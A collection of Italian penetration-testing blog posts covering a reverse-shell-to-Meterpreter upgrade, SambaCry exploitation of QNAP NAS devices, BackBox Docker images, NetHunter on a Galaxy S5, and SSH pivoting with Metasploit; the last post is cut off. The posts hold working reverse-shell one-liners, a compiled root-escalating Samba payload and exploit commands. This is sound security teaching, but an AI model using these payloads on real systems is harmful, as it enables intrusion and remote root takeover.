[{"content":"Durante un pen test potreste avere nella necessità di utilizzare un exploit che non fa parte del framework metasploit, di conseguenza dovreste rinunciare anche ad una shell meterpeter.\nIn questo articolo cercherò di spiegare come eseguire una classica reverse shell (netcat, bash, python ecc…) su metasploit per poi migrare su una sessione meterpeter.\nPerchè meterpeter? Utilizzare una shell meterpeter ha moltissimi vantaggi tra cui:\n Sfruttare i moduli di “post exploitation” per provare a scalare i privilegi. Eseguire un dump degli hash o password della macchina compromessa. Sfruttare la sessione meterpeter per movimenti laterali o pivoting.  Scenario Immaginiamo la situazione in cui abbiamo già compromesso da remoto un server linux, ma vogliamo passare da una bash reverse shell a una sessione meterpeter.\n Attacker (Kali Linux) – 10.21.12.41 Target (CentOS 7) – 10.21.12.81  Exploiting Passiamo alla fase più interessante, ovvero quella pratica.\nAttacker Nella macchina Kali dell’attaccante è necessario far partire metasploit:\nroot@kali:~# msfconsole\nDopo di che si andrà a caricare il modulo “exploit/multi/handler” che servirà a ricevere la connessione della reverse shell:\nmsf \u0026gt; use exploit/multi/handler msf exploit(handler) \u0026gt; A questo punto sarà necessario configurare l’ip locale dove mettere in ascolto l’handler, la porta locale della shell ed il payload:\nmsf exploit(handler) \u0026gt; set LHOST 10.21.12.41 LHOST =\u0026gt; 10.21.12.41 msf exploit(handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf exploit(handler) \u0026gt; set payload linux/x64/shell/reverse_tcp payload =\u0026gt; linux/x64/shell/reverse_tcp msf exploit(handler) \u0026gt; Infine eseguire l’handler:\nmsf exploit(handler) \u0026gt; run [*] Started reverse TCP handler on 10.21.12.41:4444 [*] Starting the payload handler... Target Da un qualsiasi terminale è necessario collegarsi sul server target per eseguire una reverse shell verso la macchina Kali, nel mio caso l’ip è 10.21.12.41:\n[root@node01 ~]# bash -i \u0026gt;\u0026amp; /dev/tcp/10.21.12.41/4444 0\u0026gt;\u0026amp;1   Nota: Come ho scritto nella sezione precedente emuleremo manualmente la fase di exploiting e l’esecuzione di una bash reverse shell, lo scopo dell’articolo è quello di eseguire il payload meterpeter sul server target.\n Attacker Tornando sul terminale dell’attaccante vedremo la connessione stabilita con la reverse shell:\nPremendo i tasti “Ctrl+Z“, e alla richiesta di conferma il tasto “y“, la sessione verrà eseguita in background:\n[root@node01 ~]# ^Z Background session 1? [y/N] y Adesso non resta che passare alla shell meterpeter tramite il modulo:\n“post/multi/manage/shell_to_meterpreter”\nBasterà selezionare il modulo, settare la sessione appena eseguita in background, eseguire shell_to_meterpeter ed infine passare alla nuova sessione aperta dalla shell meterpeter:\nmsf exploit(handler) \u0026gt; **use post/multi/manage/shell_to_meterpreter msf post(shell_to_meterpreter) \u0026gt; set session 1 session =\u0026gt; 1 msf post(shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.21.12.41:4433 [*] Starting the payload handler... [*] Sending stage (797784 bytes) to 10.21.12.81 [*] Meterpreter session 2 opened (10.21.12.41:4433 -\u0026gt; 10.21.12.81:41854) at 2017-06-18 22:41:27 +0200 [*] Command stager progress: 100.00% (668/668 bytes) [*] Post module execution completed msf post(shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2... meterpreter \u0026gt; sysinfo Computer : node01.homelab.it OS : CentOS 7.3.1611 (Linux 3.10.0-514.10.2.el7.x86\\_64) Architecture : x64 Meterpreter : x86/linux meterpreter \u0026gt; Anche per oggi è tutto e mi raccomando: provate, provate e riprovate!\nRiferimenti  https://www.rapid7.com/db/modules/post/multi/manage/shell_to_meterpreter http://www.hackingtutorials.org/networking/upgrading-netcat-shells-to-meterpreter/  ","permalink":"https://www.homelab.it/index.php/2017/06/21/migrare-da-reverse-shell-a-meterpeter/","summary":"Durante un pen test potreste avere nella necessità di utilizzare un exploit che non fa parte del framework metasploit, di conseguenza dovreste rinunciare anche ad una shell meterpeter.\nIn questo articolo cercherò di spiegare come eseguire una classica reverse shell (netcat, bash, python ecc…) su metasploit per poi migrare su una sessione meterpeter.\nPerchè meterpeter? Utilizzare una shell meterpeter ha moltissimi vantaggi tra cui:\n Sfruttare i moduli di “post exploitation” per provare a scalare i privilegi.","title":"Come migrare da una reverse shell a meterpeter"},{"content":"Eccomi di ritorno dalle meritate ferie, e come promesso, sono pronto a mettere nero su bianco i miei test effettuati con la vulnerabilità SambaCry.\nQuesto post potrà esservi utile per sfruttare la vulnerabilità SambaCry nei server samba installati nei dispositivi nas QNAP o ARM in generale, senza dover utilizzare il framework Metasploit.\nNon voglio dilungarmi nella descrizione della vulnerabilità, googlando SambaCry o CVE-2017-7494 troverete tonnellate di materiale.\nIn poche parole questo bug permette di eseguire comandi sul server samba remoto, l’unico requisito è l’accesso in scrittura di una cartella condivisa!\nUn ipotetico malintenzionato non dovrebbe far altro che caricare sulla cartella remota un libreria condivisa (shared library) contenente una backdoor per poi farla eseguire al demone samba tramite una semplice richiesta named pipe.\nQui si scatena il Remote Code Execution.\nDopo un po di teoria partiamo con i requisiti necessari ad effettuare i test.\nRequisiti  Una distribuzione Linux, io ho utilizzato Kali e BackBox x64 Un compilatore per processori ARM x86 (arm cross compiler) Libreria python Impacket Exploit SambaPipe.py Python \u0026lt; 2.7 Netcat  Installazione requisiti Come anticipato nella sezione precedente ho effettuato i test con le distribuzioni Kali e BackBox: Python 2.7, impacket e netcat sono già preinstallati.\nNonostante ciò ho dovuto aggiornare la libreria impacket con l’ultima versione perché ho riscontrato problemi all’esecuzione dell’exploit SambaPipe.\n  Nota: non ho appurato se questa operazione può alterare il funzionamento di altri tools all’interno delle distribuzioni.\nVi consiglio caldamente di effettuare questa operazione in una virtual machine o macchina di test.\n Partiamo con l’aggiornamento di impacket:\nroot@kali:~# git clone https://github.com/CoreSecurity/impacket root@kali:~# cd impacket root@kali:~# python setup.py install e proseguiamo con l’installazione del compilatore arm:\nroot@kali:~# apt-get install libc6-armel-cross libc6-dev-armel-cross binutils-arm-linux-gnueabi \\\\ libncurses5-dev gcc-arm-linux-gnueabi g++-arm-linux-gnueabi Dopo di che troveremo l’exploit scritto da beto (@agsolino) nel path:\n/usr/local/bin/sambaPipe.py\nCreazione payload Per sfruttare la vulnerabilità SambaCry è necessario creare una shared library da far eseguire al server samba.\nCome payload ho scelto una bash reverse shell, ma con una particolarità: esegue un privilege escalation per guadagnare i permessi di root (grazie a Bobby ‘Tables‏ @info_dox per il suggerimento)\nCon l’editor preferito creiamo due file poc.h e poc.c:\n--poc.h--- #ifndef poc_h__ #define poc_h__ extern int samba_init_module(void); #endif ----------- ---poc.c--- #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; extern bool change_to_root_user(void); int samba_init_module(void) { change_to_root_user(); system(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.10/4444 0\u0026gt;\u0026amp;1\u0026#34;); return 0; } -----------   Nota: Sostituire l’ip e la porta scritta in rosso. Eseguire un semplice: ifconfig per leggere il proprio ip.\n A questo punto non resta che compilare la nostra reverse shell per l’architettura arm:\nroot@kali:~# arm-linux-gnueabi-gcc -c -Wall -Werror -fpic poc.c root@kali:~# arm-linux-gnueabi-gcc -shared -o r3vsh3ll.so poc.o Il risultato è la shared library: r3vsh3ll.so\nExploiting SambaCry Adesso che tutto il materiale è pronto facciamo un riepilogo:\n Client – Kali: 192.168.0.10 Target – QNAP: 192.168.0.4 Exploit: SambaPipe.py Payload: r3vsh3ll.so  In giro ho trovato vari exploit e poc che utilizzavano la libreria impacket, ma tutti avevano un problema comune: non funzionavano con il protocollo smbv1.\nDa quello che ho potuto constatare i nas QNAP di default utilizzano samba con il protocollo smbv1.\nMentre sperimentavo e imprecavo contro python, il buon beto pubblicava un aggiornamento della libreria impacket con l’exploit SambaPipe.py.\nTra le sue varie opzioni sono disponibili anche le seguenti caratteristiche:\n Ricerca automatica dell cartelle condivise con accesso in scrittura. Ricerca automatica del path remoto dove risiede la backdoor caricata. Autoriconoscimento dei protocolli samba 1, 2 e 3 del server target. Autenticazione anonima o tramite credenziali.  In questa fase avremo bisogno di due terminali, uno da dove eseguiremo l’exploit e l’altro dove attenderemo la chiamata della reverse shell.\nPartiamo con netcat.\nMettiamoci in ascolto sulla porta scelta all’interno del payload precedentemente generato, nel mio caso la 4444:\nroot@kali:~# nc -lvp 4444 Il risultato sarà il seguente:\nNel secondo terminale invece facciamo partire l’exploit:\nroot@kali:~# sambaPipe.py -so r3vsh3ll.so 192.168.0.4   Nota: lo switch “-so” serve a spacificare il payload da caricare sul server target. Eseguendo l’exploit senza parametri riceverete l’intera lista delle opzioni.\n Dall’immagine si può notare che l’exploit ha trovato accesso anonimo in scrittura alla cartella Public ed ha eseguito la reverse shell.\nSpostandosi sul primo terminale, se tutto è andato a buon fine, avremo la nostra bella shell con diritti di root:\nQNAP – fix SambaCry I test che ho riportato in questo post sono stati effettuati nel modello di QNAP: TS-219P\nControllando la pagina “Release Notes for QTS“, l’ultimo firmware vulnerabile è il numero 4.3.3.0188 mentre il 2017/06/07 è stata rilasciata la patch nel firmware numero 4.3.3.0210\nSuggerimenti  Sul server samba di test abilitate l’opzione “log level = 10“, in questo modo avrete il massimo della verbosità dei log e potrete vedere quando i tentativi di iniettare la libreria andranno a buon fine. Se settate l’opzione “log level = 10” in un dispositivo QNAP, ricordatevi di svuotare continuamente i log di samba, altrimenti rischierete di finire lo spazio disco. Utilizzate un analizzatore di rete tipo wireshark per capire come funziona la vulnerabilità e il protocollo samba in generale.  Riferimenti  https://github.com/omri9741/cve-2017-7494 https://github.com/opsxcq/exploit-CVE-2017-7494 https://github.com/CoreSecurity/impacket https://www.wireshark.org/docs/wsug_html_chunked/ https://wiki.samba.org/index.php/Setting_the_Samba_Log_Level  ","permalink":"https://www.homelab.it/index.php/2017/06/11/sfruttare-la-vulnerablitia-sambacry-nei-dispositivi-qnap-e-arm/","summary":"Eccomi di ritorno dalle meritate ferie, e come promesso, sono pronto a mettere nero su bianco i miei test effettuati con la vulnerabilità SambaCry.\nQuesto post potrà esservi utile per sfruttare la vulnerabilità SambaCry nei server samba installati nei dispositivi nas QNAP o ARM in generale, senza dover utilizzare il framework Metasploit.\nNon voglio dilungarmi nella descrizione della vulnerabilità, googlando SambaCry o CVE-2017-7494 troverete tonnellate di materiale.\nIn poche parole questo bug permette di eseguire comandi sul server samba remoto, l’unico requisito è l’accesso in scrittura di una cartella condivisa!","title":"Sfruttare la vulnerablitià Sambacry nei dispositivi QNAP/ARM"},{"content":"Da una brillante idea di jgamblin (KaliBrowser), ho provato a creare un’immagine docker con la distribuzione BackBox 4 gestibile comodamente da browser.\nPremetto che non avevo mai smanettato con i docker prima d’ora, quindi per i più esperti i miei Dockerfile potrebbero risultare orribili.\nDopo una settimana di lavoro sono riuscito a creare quattro versioni:\n BackBox4Browser XFCE – [930MB] – [Dockerfile]\n— Backbox 4 + XFCE (No tools) BackBox4Browser XFCE Full – [2GB] – [Dockerfile]\n— Backbox 4 + XFCE + BackBox Tools BackBox4Browser Fluxbox – [256MB] – [Dockerfile]\n— Backbox 4 + Fluxbox (No tools) BackBox4Browser Fluxbox Full – [1GB] – [Dockerfile]\n— Backbox 4 + Fluxbox+ BackBox Tools  Installazione L’installazione è semplicissima, a seconda della versione preferita digitare uno dei comandi seguenti:\n# pull backbox 4 + xfce docker run -t -i -d -p 6080:6080 claudioviviani/backbox4browser-xfce # pull backbox 4 + xfce + backbox-tools docker run -t -i -d -p 6080:6080 claudioviviani/backbox4browser-xfce-full # pull backbox 4 + fluxbox docker run -t -i -d -p 6080:6080 claudioviviani/backbox4browser-fluxbox # pull backbox 4 + fluxbox + backbox-tools docker run -t -i -d -p 6080:6080 claudioviviani/backbox4browser-fluxbox-full Ci tengo a precisare che l’ immagine docker verrà scaricata nel vostro container locale soltanto alla prima esecuzione del comando.\nBackBox + Browser = BackBox4Browser Eccoci finalmente alla parte più interessante, ovvero il collegamento verso l’ambiente grafico della distribuzione BackBox.\nVNC sarebbe il protocollo da utilizzare, ma grazie al websocket noVNC basterà aprire il browser e sfruttare la potenza del linguaggio HTML5.\nL’unica operazione da fare è quella di aprire il browser facendolo puntare all’indirizzo ip dell’interfaccia di rete docker sulla porta 6080:\nBackbox, basandosi su Ubuntu, di default parte con un utente non privilegiato.\nRispettando questa filosofia, nell’immagine docker ho creato l’utente bbuser abilitato all’utilizzo di sudo.\n Username: bbuser\nPassword: bbuser\n ","permalink":"https://www.homelab.it/index.php/2016/06/25/backbox4browser-backbox-browser/","summary":"Da una brillante idea di jgamblin (KaliBrowser), ho provato a creare un’immagine docker con la distribuzione BackBox 4 gestibile comodamente da browser.\nPremetto che non avevo mai smanettato con i docker prima d’ora, quindi per i più esperti i miei Dockerfile potrebbero risultare orribili.\nDopo una settimana di lavoro sono riuscito a creare quattro versioni:\n BackBox4Browser XFCE – [930MB] – [Dockerfile]\n— Backbox 4 + XFCE (No tools) BackBox4Browser XFCE Full – [2GB] – [Dockerfile]","title":"BackBox4Browser: BackBox in a Browser"},{"content":"Al giorno d’oggi per eseguire attacchi informatici le alternative alla classica workstation sono svariate: tablet, smartphone, raspberry fino ad arrivare ai droni.\nNaturalmente ci sono anche i lati “white” della medaglia, ad esempio chi lavora nell’ IT security può trarre vantaggio nel poter testare applicativi o infrastrutture comodamente dal proprio device portatile.L’azienda Offensive Security, nota per la famosa Kali Linux e per le prestigiosi certificazioni, ha ideato una distribuzione di penetration testing appositamente per i dispositivi mobile: Kali Linux NetHunter.\nDa specifiche la distribuzione NetHunter viene rilasciata per i device Nexus 4/5/6/7/9/10 e OnePlus One Phone, ma grazie al lavoro di jcadduno è possibile installare un kernel compatibile con i device Galaxy S5 e Galaxy Note 3.\nI sorgenti del kernel, naturalmente open-source , sono scaricabili all’indirizzo github.\nPossedendo un Samsung Galaxy S5 (klte), spinto dalla curiosità di provare NetHunter ho deciso di scrivere questo post per condividere la mia esperienza nella speranza che possa essere d’aiuto.\nPremessa Il post verrà aggiornato via via che troverò bug o informazioni interessanti da pubblicare, detto questo ci tengo a precisare quattro punti fondamentali:\n Non mi ritengo responsabile per qualsiasi danno che potreste recare al vostro dispositivo o verso terzi bla bla bla ecc… Per installare NetHunter sarà necessario eseguire il root del vostro dispositivo così da far decadere la garanzia Samsung!!!! Per installare NetHunter sarà necessario eseguire un wipe completo del dispositivo, quindi verrà cancellato TUTTO il contenuto. Per utilizzare i tools wifi di NetHunter sarà necessario utilizzare un dongle usb Wifi e un cavetto/convertitore usb OTG  La procedura d’installazione che ho seguito a grandi linee è consultabile nel forum xda-developers: Kali NetHunter for the Galaxy S5\nQuesto post vuole essere, almeno per adesso, solo una linea guida.\nNon ho molta esperienza nel rooting o modding dei device Android ma ho cercato di riportare tutti gli articoli e video più interessanti che ho seguito per raggiungere lo scopo.\nPrerequisiti  Samsung Galaxy S5 klte SM–G900F Microsd (memoria espansione) con almeno 2GB liberi Driver Samsung per Windows Windows 7/8/10 Cavetto micro-usb -\u0026gt; USB per collegare lo smartphone al pc Ultima versione Odin (Android ROM Flashing ROM) Ultima versione Recovery Rom TWRP 3.x Ultima versione CF-Auto-Root Ultima versione CyanogenMod 13.x per Samsung S5 klte Ultima versione Google Apps o Open GApps Ultima versione NetHunter 3 kernel-nethunter-klte e nethunter-generic-armhf-kalifs-full-rolling  Operazioni preinstallazione La prima azione da fare è quella di farsi un bel backup dei dati personali presenti nel dispositivo.\nEsistono vari tipi di programmi e applicazioni, scegliete quello che preferite.\nFatto il backup scaricate e installate i driver Samsung per Windows (vedi punto 3 prerequisiti).\nAdesso che il vostro sistema Windows è in grado di rilevare il dispositivo Samsung, dovete abilitare:\n Opzione sviluppatore (Video|Testo) Debug USB (Video|Testo)  Installazione Recovery Manager TWRP è una recovery rom che permette di eseguire varie operazioni nella fase di boot del telefono, ovvero prima che parta il sistema Android.\nTra le sue moltissime utilità quella che preferisco è la possibilità di fare il backup completo e restore del dispositivo, questa tecnica di salvataggio viene chiamata: nandroid backup.Backup a parte, TWRP vi servirà per scrivere la memoria interna con le rom desiderate (ROM flashing) prelevandole direttamente dalla memoria d’espansione del telefono (microSD).\nPrima di iniziare con le varie operazioni dovrete scaricare l’ultima versione di Odin (punto 6 prerequisiti) e TWRP (punto 7 prerequisiti).\nOdin è il software che vi permetterà di sostituire la stock recovery del telefono Samsung con la ROM TWRP.\nEcco gli step che dovrete eseguire:\n Spengere il telefono ed avviare Android in “Download Mode” (Video|Testo) Eseguire il ROM flashing di TWRP tramite Odin (Video|Testo)  Root Samsung Galaxy S5 Per acquisire i diritti di root e installare una Custom ROM ho utilizzato metodo Odin + CF-Auto-Root.\nNel momento in cui sto scrivendo l’articolo la versione stock di Android più aggiornata per il Samsung S5 è la 5.0 (Lollipop).\nNella pagina autoroot chainfire, cercate all’interno della tabella il modello “SM-G900F” e a seconda del proprio Build ID scaricate il pacchetto necessario.\nIl Build ID lo troverete nel menù informazioni del telefono (Opzioni -\u0026gt; Info Telefono).\nEcco gli step che dovrete eseguire:\n Spengere il telefono ed avviare Android in “Download Mode” (Video|Testo) Collegare il telefono al pc ed eseguire il root (Video|Testo)  Installazione Custom ROM CyanogenMod + Google Apps Prima di cominciare ad installare la custom ROM, se non è stato già fatto, eseguire il backup del dispositivo dato che sarà necessario effettuare un wipe completo.\nSia il wipe che l’installazione della rom e delle google apps verranno effettuati dalla modalità recovery (TWRP).\nEcco gli step che dovrete eseguire:\n Collegare il dispositivo al pc e copiare gli archivi compressi di CyanogenMod 13 e Google apps dentro la memoria esterna (microSD). Spengere il dispositivo e riavviarlo in modalità recovery. (Video|Testo) Da TWRP eseguire il wipe completo (Video|Testo) Da TWRP installare la custom ROM CyanogenMod 13 (Video|Testo) Da TWRP installare le Google apps (Video|Testo) Riavviare il dispositivo ed effettuare il primo accesso a CyanogenMod  Installazione kernel NetHunter L’installazione del kernel va eseguita sempre con TWRP nelle stesse modalità d’installazione delle Google Apps:\n Collegare il dispositivo al pc e copiare l’archivio kernel-nethunter-klte dentro la memoria esterna (microSD). Spengere il dispositivo e riavviarlo in modalità recovery. Da TWRP installare il kernel NetHunter. Riavviare il dispositivo e controllare se il boot avviene in maniera corretta.  Installazione pacchetto completo NetHunter L’installazione del pacchetto completo NetHunter va eseguita sempre con TWRP nelle stesse modalità d’installazione delle Google Apps:\n Collegare il dispositivo al pc e copiare l’archivio nethunter-generic-armhf-kalifs-full-rolling dentro la memoria esterna (microSD). Spengere il dispositivo ed avviarlo in modalità recovery Da TWRP installare il pacchetto nethunter-generic-armhf-kalifs-full-rolling Riavviare il dispositivo e controllare se il boot avviene in maniera corretta.  Operazioni postinstallazione Se tutto è andato a buon fine non vi resta che eseguire l’applicazione “NetHunter” in modo da preparare l’ambiente chroot per il sistema.\nAppena cliccato sull’icona apparirà la richiesta dell’app SuperSU che vi chiederà i permessi per eseguire NetHunter come super user, naturalmente dovrete acconsentire.\nWi-fi Come anticipato all’inizio dell’articolo, il chipset wifi a bordo del Samsung Galaxy S5 non supporta la modalità injection e monitor.\nPer utilizzare i vari software come wifite o aircrack-ng dovrete utilizzare un dongle wifi usb che supporti le modalità sopraelencate e un adattatore/cavo Micro USB to USB OTG.\nAggiornamenti CyanogenMod Quando installerete gli aggiornamenti di CyanogenMod sul vostro Samsung, il custom kernel e il SuperSU di NetHunter non saranno più presenti.\nPer rendere il ripristinare tutto i passaggi sono:\n Scaricare dal sito idlekernel l’ultima versione del kernel-nethunter-klte-marshmallow e update-nethunter-generic-armhf Collegare il telefono al pc e copiare i precedenti file nella memoria microSD esterna Riavviare il telefono in modalità recovery (TWRP) ed eseguire un backup del dispositivo Avviare CyanogenMod ed eseguire l’aggiornamento di sistema Riavviare il telefono in modalità recovery (TWRP) ed installare i pacchetti kernel-nethunter-klte-marshmallow e update-nethunter-generic-armhf Entrare nel sistema Android ed eseguire l’applicazione NetHunter per riabilitare l’ambiente chroot  Aggiornamenti NetHunter I passaggi da eseguire per installare gli aggiornamenti sono:\n Scaricare dal sito idlekernel l’ultima versione del pacchetto update-nethunter-generic-armhf Collegare il telefono al pc e copiare il precedente file nella memoria microSD esterna Riavviare il telefono in modalità recovery (TWRP) ed eseguire un backup del dispositivo Da TWRP eseguire un dalvik cache wipe Da TWRP installare il pacchetto update-nethunter-generic-armhf  Problemi e Fix Questa sezione è dedicata ai problemi già noti o riscontrati dal sottoscritto durante l’utilizzo del sistema.\nSe riscontrate un problema vi consiglio di provare riprodurlo con il sistema pulito, ovvero senza NetHunter, tenete di conto che la distribuzione CyanogenMod 13 è una versione nightly quindi da considerare come unstable.\n L’installazione su CyanogenMod 12 sembra non funzionare.\nAl contrario da come viene specificato sul forum del progetto, ho riscontrato un grosso problema nell’installare NetHunter sulla versione CyanogenMod 12 di Android.\nRiesco ad installare il custom kernel tranquillamente ma dopo l’installazione del pacchetto nethunter-generic-armhf-kalifs-full-rolling entro in un loop al momento del boot. **USB Keyboard \u0026amp; VNC\n**Google Keyboard, AOSP Keyboard, CM Keyboard non funzionano correttamente col VNC client, utilizzare Hacker’s Keyboard. **Applicazione Terminale\n**Non funzionano correttamente le applicazioni tipo vim o nano in full-screen, eseguire il comando “resize” ogni volta che si apre un nuovo terminale. **Problema Fotocamera\n**Le fotocamere dello smartphone diventano inutilizzabili dopo un periodo di tempo non definito dall’accensione del dispositivo.\nHo riscontrato il problema con le app Whatsapp, Twitter, Camera, Instagram ecc…\nReinstallando una versione pulita di CyanogenMod il problema NON si ripresenta, quindi credo che la causa sia da additare al pacchetto nethunter-generic-armhf-kalifs-full-rolling. [UPDATE 01-06-2016 – Il problema pare fixato ]  Foto di rito 😀 ","permalink":"https://www.homelab.it/index.php/2016/05/16/nethunter-samsung-galaxy-s5/","summary":"Al giorno d’oggi per eseguire attacchi informatici le alternative alla classica workstation sono svariate: tablet, smartphone, raspberry fino ad arrivare ai droni.\nNaturalmente ci sono anche i lati “white” della medaglia, ad esempio chi lavora nell’ IT security può trarre vantaggio nel poter testare applicativi o infrastrutture comodamente dal proprio device portatile.L’azienda Offensive Security, nota per la famosa Kali Linux e per le prestigiosi certificazioni, ha ideato una distribuzione di penetration testing appositamente per i dispositivi mobile: Kali Linux NetHunter.","title":"NetHunter e Samsung Galaxy S5:Ecco la mia esperienza"},{"content":"Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.\nPivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).\nFaccio un piccolo esempio in cui ci sono tre attori:\n Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.\nPossiamo considerare questi instradamenti come veri e propri forward.\nSSH Pivoting Tramite il protocollo ssh è possibile creare dei tunnels per redirigere il traffico di una o più porte tcp, l’unico requisito obbligatorio è l’opzione “AllowTcpForwarding” abilitata nella configurazione del server sshd.\nNon è prettamente necessario un’ account privilegiato.\nPer creare tunnel ssh le opzioni da utilizzare nel client sono:\n [-L [bind_address:]port:host:hostport] —\u0026gt; Forward di una singola porta\n[-D [bind_address:]port] —\u0026gt; Forward di porte dinamiche\n[-R [bind_address:]port:host:hostport] —\u0026gt; Reverse Tunnel\n Di seguito riporterò alcuni esempi, per cominciare il forward di una singola porta:\n# Tunnel che permette di collegarsi sulla porta 80 del server 10.0.0.10 tramite 10.0.0.101\r#\r# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost\rclaudio@KaliCla:~$ ssh -L8080:10.0.0.10:80 user@10.0.0.101\rclaudio@KaliCla:~$\rclaudio@KaliCla:~$ curl http://127.0.0.1:8080 SSH Proxy socks :\n# Tunnel che crea un socks proxy sulla porta 8080 tramite 83.149.x.x\r#\r# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost\rclaudio@KaliCla:~$ ssh -D 8080 root@83.149.x.x # Controllo ip personale claudio@KaliCla:~$ curl http://ifconfig.me\r2.236.x.x\r# Testo il proxy socks appena creato\rclaudio@KaliCla:~$ curl --socks5 127.0.0.1:8080 http://ifconfig.me\r83.149.x.x Proxychain è un tool che permette di eseguire qualsiasi programma attraverso http o socks proxy, quindi è possibile configurarlo in modo tale da utilizzare il tunnel dinamico creato precedentemente.\nDi default proxychains è configurato per utilizzare come socks server TOR.\nModificare la parte finale del file /etc/proxychains.conf così:\n[ProxyList]\r# add proxy here ...\r# meanwile\r# defaults set to \u0026#34;tor\u0026#34;\r#socks4 127.0.0.1 9050\rsocks4 127.0.0.1 8080 Per eseguire proxychains basta anteporlo al programma desiderato:\nclaudio@KaliCla:~$ proxychains curl http://ifconfig.me\rProxyChains-3.1 (http://proxychains.sf.net)\r|DNS-request| ifconfig.me |S-chain|-\u0026lt;\u0026gt;-127.0.0.1:8080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-4.2.2.2:53-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK\r|DNS-response| ifconfig.me is 153.121.72.212\r|S-chain|-\u0026lt;\u0026gt;-127.0.0.1:8080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-153.121.72.212:80-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK\r83.149.x.x\rclaudio@KaliCla:~$ Se all\u0026rsquo;interno della rete 83.149.x.x volessimo collegarci al servizio ftp del server 192.168.0.2, basterebbe digitare:\nclaudio@KaliCla:~$ proxychains telnet 192.168.0.3 21\rProxyChains-3.1 (http://proxychains.sf.net)\rTrying 192.168.0.3...\r|S-chain|-\u0026lt;\u0026gt;-127.0.0.1:8080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-192.168.0.3:21-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK\rConnected to 192.168.0.3.\rEscape character is \u0026#39;^]\u0026#39;.\r220-FileZilla Server version 0.9.36 beta\r220-written by Tim Kosse (Tim.Kosse@gmx.de)\r220 Please visit http://sourceforge.net/projects/filezilla/ Per vnc o remotedesktop:\nclaudio@KaliCla:~$ proxychains remmina\rProxyChains-3.1 (http://proxychains.sf.net)\rRemmina plugin VNC (type=Protocol) registered.\rRemmina plugin VNCI (type=Protocol) registered.\rRemmina plugin RDP (type=Protocol) registered.\rRemmina plugin RDPF (type=File) registered.\rRemmina plugin RDPS (type=Preference) registered.\rRemmina plugin SFTP (type=Protocol) registered.\rRemmina plugin SSH (type=Protocol) registered. Scansione TCP del server 192.168.0.2 tramite nmap\nclaudio@KaliCla:~$ proxychains nmap -sT 192.168.0.3\rProxyChains-3.1 (http://proxychains.sf.net)\r|S-chain|-\u0026lt;\u0026gt;-127.0.0.1:8080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-192.168.0.3:80-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK\r...\r...\rStarting Nmap 7.01 ( https://nmap.org ) at 2016-04-11 23:09 CEST\rNmap scan report for 192.168.0.3\rHost is up (0.085s latency).\rNot shown: 986 closed ports\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 2.0.5\r22/tcp open ssh OpenSSH 4.3 (protocol 2.0)\r25/tcp open smtp Sendmail 8.13.8/8.13.8\r80/tcp open http Apache httpd 2.2.3 ((CentOS))\r106/tcp open tcpwrapped\r110/tcp open pop3 Dovecot pop3d\r143/tcp open imap Dovecot imapd\r873/tcp open rsync (protocol version 30)\r993/tcp open ssl/imap Dovecot imapd\r995/tcp open ssl/pop3 Dovecot pop3d\r1110/tcp open pop3 Dovecot pop3d\r2525/tcp open smtp Sendmail 8.13.8/8.13.8\r5666/tcp open tcpwrapped\r10000/tcp open http MiniServ 1.680 (Webmin httpd) Come si può notare ci sono moltissimi modi di sfruttare i forward dinamici tramite ssh, basta ingegnarsi un minimo.\nSSH Pivoting e Metasploit Dopo un’infarinatura generale di tunnel e forward ssh, vediamo come sfruttare la tecnica pivoting per eseguire attacchi tramite il famoso framework Metasploit.\nHo deciso di suddividere questa sezione in due parti, nella prima attaccheremo un server presente nella nostra stessa subnet, mentre nella seconda la vittima risiederà in una rete differente.\nAttacco n.1 (Medesima subnet) Nel grafico precedente ho cercato di raffigurare le varie fasi dell’attacco:\nIl server A viene utilizzato per creare un tunnel ssh e raggiungere la porta 445 del server B (freccia verde) così da poter sfruttare la ormai datata vulnerabilità MS08-067 (freccia blu).\nUna volta compromesso, sul server B verrà eseguita una reverse shell verso il Client (freccia viola).\nIn questo caso il tunnel serve a bypassare il firewall del server B che blocca le connessioni dirette del Client (freccia rossa).\nTunnel Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 10.0.0.20:\nclaudio@KaliCla:~$ ssh -L9445:10.0.0.20:445 user@10.0.0.101\rclaudio@10.0.0.101\u0026#39;s password: [user@webserver01 ~]$ Preparo l’attacco Apro Metasploit, carico l\u0026rsquo;exploit, scelgo il payload, configuro i parametri.\n######## #\r################# #\r###################### #\r######################### #\r############################\r##############################\r###############################\r###############################\r##############################\r# ######## #\r## ### #### ##\r### ###\r#### ###\r#### ########## ####\r####################### ####\r#################### ####\r################## ####\r############ ##\r######## ###\r######### #####\r############ ######\r######## #########\r##### ########\r### #########\r###### ############\r#######################\r# # ### # # ##\r########################\r## ## ## ##\rhttp://metasploit.pro\rFrustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with\rMetasploit Pro -- learn more on http://rapid7.com/metasploit\r=[ metasploit v4.11.5-2016010401 ]\r+ -- --=[ 1517 exploits - 875 auxiliary - 257 post ]\r+ -- --=[ 437 payloads - 37 encoders - 8 nops 